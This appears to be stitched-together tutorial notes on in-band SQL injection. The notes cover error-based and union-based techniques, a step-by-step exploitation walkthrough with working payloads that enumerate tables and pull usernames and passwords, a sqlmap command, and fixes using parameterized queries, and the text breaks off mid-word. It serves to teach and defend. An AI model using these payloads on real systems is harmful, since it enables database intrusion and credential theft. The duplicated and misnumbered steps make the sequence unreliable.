# In-Band SQL Injection (SQLi)

In-Band SQL Injection is one of the most common and straightforward types of SQL injection attacks where the attacker uses the same communication channel to both launch the attack and gather results.

## Types of In-Band SQLi:

1. **Error-Based SQLi**:
   - Relies on error messages returned by the database server
   - Attacker intentionally causes errors to extract information
   - Example: `' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--`

2. **Union-Based SQLi**:
   - Uses the UNION SQL operator to combine results from multiple SELECT statements
   - Requires knowledge of the database structure
   - Example: `' UNION SELECT username, password FROM users--`

## Characteristics:
- Results are returned directly in the application's response
- Easier to exploit than other types (blind SQLi)
- Often used for data extraction

## Prevention:
- Use parameterized queries/prepared statements
- Implement proper error handling (don't show DB errors to users)
- Apply principle of least privilege for DB accounts
- Use web application firewalls (WAFs)

 # In-Band SQL Injection: Error-Based and Union-Based

## Error-Based SQL Injection

Error-based SQL injection is a technique where attackers deliberately cause the database to generate error messages that reveal information about the database structure or contents.

**How it works:**
1. The attacker submits malicious input that causes a SQL error
2. The application displays the error message (either directly or in logs)
3. The error contains sensitive information about:
   - Database structure (table names, column names)
   - Database type/version
   - Query syntax that can be exploited further

**Example:**
```sql
' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
```
This might return an error like:
```
Conversion failed when converting the nvarchar value 'users' to data type int.
```
Revealing that there's a table called "users".

**Characteristics:**
- Relies on verbose error reporting
- Works even when no data is returned to the user
- Often used for reconnaissance before other attacks

## Union-Based SQL Injection

Union-based SQL injection leverages the UNION SQL operator to combine results from the original query with results from an injected query.

**How it works:**
1. The attacker determines the number of columns in the original query
2. They craft a UNION SELECT statement with matching columns
3. The database combines and returns results from both queries

**Example:**
```sql
' UNION SELECT username, password FROM users--
```

**Key requirements:**
1. Both queries must return the same number of columns
2. Corresponding columns must have compatible data types

**Process for exploitation:**
1. Find vulnerable parameter (through testing with `'` or `"`)
2. Determine number of columns (using ORDER BY or UNION SELECT NULL,...)
3. Identify which columns are displayed in output
4. Craft UNION SELECT to extract desired data

**Example step-by-step:**

1. Test for vulnerability:
   ```sql
   product.php?id=1'
   ```

2. Find number of columns:
   ```sql
   product.php?id=1 ORDER BY 5-- 
   ```
   Increase number until you get an error (error at 5 means 4 columns)

3. Confirm with UNION:
   ```sql
   product.php?id=-1 UNION SELECT NULL,NULL,NULL,NULL--
   ```

4. Identify displayed columns by replacing NULLs one by one:

## Step 4: Identifying Vulnerable Parameters
1. **Test all input fields**: Try basic SQL injection payloads in:
   - URL parameters (e.g., `?id=1`)
   - Form fields (login/search)
   - HTTP headers (User-Agent, Referer)

2. **Common vulnerable patterns**:
   ```sql
   ' OR 1=1 --
   " OR 1=1 --
   1' ORDER BY 1--
   1' UNION SELECT null--
   ```

## Step 5: Determining Database Structure
1. **Find number of columns**:
   ```sql
   ' ORDER BY 5-- 
   ```
   Increase number until error occurs to find column count

2. **Identify useful columns**:
   ```sql
   ' UNION SELECT 1,2,3,4,5--
   ```
   Note which numbers appear in output

## Step 6: Extracting Data
1. **Get database version** (replace visible column number):
   ```sql
   ' UNION SELECT 1,@@version,3,4,5--
   ```

2. **List tables**:
   ```sql
   ' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--
   ```

3. **Extract column names from interesting tables**:
   ```sql
   ' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--
   ```

## Step 7: Retrieving Sensitive Data
```sql
' UNION SELECT 1,username||':'||password,3,4,5 FROM users--
```

## Step 8: Automated Tools (Optional)
Consider using sqlmap for more efficient exploitation:
```bash
sqlmap -u "http://example.com/page?id=1" --dbs --batch
```

Fix after the step-by-step implementation

 # Fixing In-Band SQL Injection (01-In-Band-SQLi)

## Implementation Steps

1. **Identify vulnerable parameters**:
   - Locate all user input fields that interact with database queries
   - Common targets: login forms, search fields, URL parameters

2. **Implement parameterized queries**:
   ```python
   # Vulnerable
   query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
   
   # Fixed with parameterized query
   cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
   ```

3. **Use prepared statements**:
   ```java
   // Vulnerable
   String query = "SELECT * FROM users WHERE username = '" + username + "'";
   
   // Fixed with prepared statement
   PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username = ?");
   stmt.setString(1, username);
   ```

4. **Implement input validation**:
   - Whitelist allowed characters for each field type
   - Example for usernames: only alphanumeric and certain special characters

3. **Apply the principle of least privilege**:
   - Database user should have only necessary permissions
   - Avoid using admin/s
